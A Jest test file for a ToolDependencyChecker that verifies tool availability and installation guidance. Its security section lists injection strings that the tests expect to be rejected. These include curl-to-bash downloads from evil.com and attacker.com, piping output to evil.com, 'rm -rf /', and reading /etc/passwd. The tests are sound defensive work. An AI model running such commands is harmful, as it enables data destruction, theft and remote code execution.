/**
 * Tests for ToolDependencyChecker
 */

import { ToolDependencyChecker, ToolDependency } from '../ToolDependencyChecker';

// Mock execa
jest.mock('execa');
const mockExeca = jest.requireMock('execa').execa;

describe('ToolDependencyChecker', () => {
  let checker: ToolDependencyChecker;

  beforeEach(() => {
    checker = new ToolDependencyChecker();
    jest.clearAllMocks();
  });

  describe('checkToolDependencies', () => {
    it('should return empty array for no dependencies', async () => {
      const results = await checker.checkToolDependencies([]);
      expect(results).toEqual([]);
    });

    it('should check ast-grep availability', async () => {
      const toolDependency: ToolDependency = {
        name: '@ast-grep/cli',
        required: false,
        installCommand: 'npm install -g @ast-grep/cli',
        description: 'AST-based code search tool',
      };

      // Mock successful command
      mockExeca.mockResolvedValue({ 
        stdout: 'ast-grep 0.12.0\n',
        stderr: '',
        exitCode: 0,
        command: 'ast-grep --version',
        escapedCommand: 'ast-grep --version'
      });

      const results = await checker.checkToolDependencies([toolDependency]);
      
      expect(results).toHaveLength(1);
      expect(results[0].tool).toBe(toolDependency);
      expect(results[0].result.available).toBe(true);
      expect(results[0].result.version).toBe('0.12.0');
    });

    it('should handle unavailable tools gracefully', async () => {
      const toolDependency: ToolDependency = {
        name: '@ast-grep/cli',
        required: true,
        installCommand: 'npm install -g @ast-grep/cli',
      };

      // Mock command failure
      mockExeca.mockRejectedValue(new Error('Command not found'));

      const results = await checker.checkToolDependencies([toolDependency]);
      
      expect(results).toHaveLength(1);
      expect(results[0].result.available).toBe(false);
      expect(results[0].result.needsInstallation).toBe(true);
    });

    it('should handle unsupported tools', async () => {
      const toolDependency: ToolDependency = {
        name: 'unknown-tool',
        required: false,
      };

      const results = await checker.checkToolDependencies([toolDependency]);
      
      expect(results).toHaveLength(1);
      expect(results[0].result.available).toBe(false);
      expect(results[0].shouldPrompt).toBe(false);
    });
  });

  describe('generateInstallationGuidance', () => {
    it('should generate guidance for required tools', async () => {
      const toolDependency: ToolDependency = {
        name: '@ast-grep/cli',
        required: true,
        installCommand: 'npm install -g @ast-grep/cli',
        description: 'AST-based code search tool',
      };

      // Mock unavailable tool
      mockExeca.mockRejectedValue(new Error('Command not found'));

      const results = await checker.checkToolDependencies([toolDependency]);
      const guidance = checker.generateInstallationGuidance(results);

      expect(guidance.required).toHaveLength(1);
      expect(guidance.installationSteps).toContain('npm install -g @ast-grep/cli');
      expect(guidance.warningMessage).toContain('@ast-grep/cli');
    });

    it('should generate guidance for optional tools', async () => {
      const toolDependency: ToolDependency = {
        name: '@ast-grep/cli',
        required: false,
        installCommand: 'npm install -g @ast-grep/cli',
      };

      // Mock unavailable tool
      mockExeca.mockRejectedValue(new Error('Command not found'));

      const results = await checker.checkToolDependencies([toolDependency], { interactive: true });
      const guidance = checker.generateInstallationGuidance(results);

      expect(guidance.optional).toHaveLength(1);
      expect(guidance.installationSteps).toContain('npm install -g @ast-grep/cli');
    });

    it('should not generate guidance for available tools', async () => {
      const toolDependency: ToolDependency = {
        name: '@ast-grep/cli',
        required: false,
        installCommand: 'npm install -g @ast-grep/cli',
      };

      // Mock available tool
      mockExeca.mockResolvedValue({
        stdout: 'ast-grep 0.12.0\n',
        stderr: '',
        exitCode: 0,
        command: 'ast-grep --version',
        escapedCommand: 'ast-grep --version'
      });

      const results = await checker.checkToolDependencies([toolDependency]);
      const guidance = checker.generateInstallationGuidance(results);

      expect(guidance.required).toHaveLength(0);
      expect(guidance.optional).toHaveLength(0);
      expect(guidance.installationSteps).toHaveLength(0);
      expect(guidance.warningMessage).toBeUndefined();
    });
  });

  describe('SECURITY: Command injection prevention', () => {
    it('should reject non-whitelisted commands', async () => {
      // Mock internal checkCommand method to test directly
      const checker = new ToolDependencyChecker();
      const checkCommand = (checker as any).checkCommand.bind(checker);

      // Test malicious command injection attempts
      const maliciousCommands = [
        'ast-grep --version; rm -rf /',
        'ast-grep --version && curl evil.com/backdoor.sh | bash',
        'rg --version; cat /etc/passwd',
        'npm install malicious-package',
        'curl attacker.com/steal-data.sh | bash',
        '; rm -rf /',
        '`rm -rf /`',
        '$(rm -rf /)',
        'rg --version | curl evil.com -d @-'
      ];

      for (const maliciousCommand of maliciousCommands) {
        await expect(checkCommand(maliciousCommand))
          .rejects
          .toThrow(`Command '${maliciousCommand}' not allowed for security reasons`);
      }
    });

    it('should only allow exact whitelisted commands', async () => {
      const checker = new ToolDependencyChecker();
      const checkCommand = (checker as any).checkCommand.bind(checker);

      // Mock successful execa for whitelisted commands
      mockExeca.mockResolvedValue({
        stdout: 'tool-version 1.0.0\n',
        stderr: '',
        exitCode: 0,
        command: 'tool-version',
        escapedCommand: 'tool-version'
      });

      const allowedCommands = [
        'ast-grep --version',
        'npx --no-install @ast-grep/cli --version',
        'rg --version'
      ];

      for (const allowedCommand of allowedCommands) {
        // Should not throw for whitelisted commands
        await expect(checkCommand(allowedCommand)).resolves.toBeDefined();
      }
    });

    it('should reject commands with additional arguments', async () => {
      const checker = new ToolDependencyChecker();
      const checkCommand = (checker as any).checkCommand.bind(checker);

      const maliciousVariations = [
        'ast-grep --version --extra-arg',
        'rg --version -h',
        'npx --no-install @ast-grep/cli --version --help',
        'ast-grep --version --config /etc/passwd'
      ];

      for (const maliciousCommand of maliciousVariations) {
        await expect(checkCommand(maliciousCommand))
          .rejects
          .toThrow('not allowed for security reasons');
      }
    });

    it('should handle command injection in tool dependency checks', async () => {
      // Test that malicious tool names/commands in dependencies are handled safely
      const maliciousTool: ToolDependency = {
        name: 'legitimate-tool; rm -rf /',
        required: false,
        checkCommands: ['legitimate-tool --version; rm -rf /']
      };

      const results = await checker.checkToolDependencies([maliciousTool]);
      
      // Should fail safely without executing malicious commands
      expect(results).toHaveLength(1);
      expect(results[0].result.available).toBe(false);
      expect(results[0].shouldPrompt).toBe(false);
    });

    it('should prevent path traversal in command execution', async () => {
      const checker = new ToolDependencyChecker();
      const checkCommand = (checker as any).checkCommand.bind(checker);

      const pathTraversalCommands = [
        '../../../bin/bash',
        '/bin/bash -c "rm -rf /"',
        '../../../../usr/bin/curl evil.com',
        './malicious-script.sh'
      ];

      for (const pathCommand of pathTraversalCommands) {
        await expect(checkCommand(pathCommand))
          .rejects
          .toThrow('not allowed for security reasons');
      }
    });

    it('should use proper error code for security violations', async () => {
      const checker = new ToolDependencyChecker();
      const checkCommand = (checker as any).checkCommand.bind(checker);

      try {
        await checkCommand('malicious-command');
        fail('Should have thrown security error');
      } catch (error: any) {
        expect(error.code).toBe('TOOL_CHECK_SECURITY_ERROR');
        expect(error.message).toContain('not allowed for security reasons');
        expect(error.suggestion).toContain('Only whitelisted commands are allowed');
      }
    });
  });
});